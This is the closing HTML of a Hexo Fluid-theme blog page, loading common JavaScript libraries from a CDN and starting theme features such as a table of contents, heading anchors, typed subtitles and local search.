<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
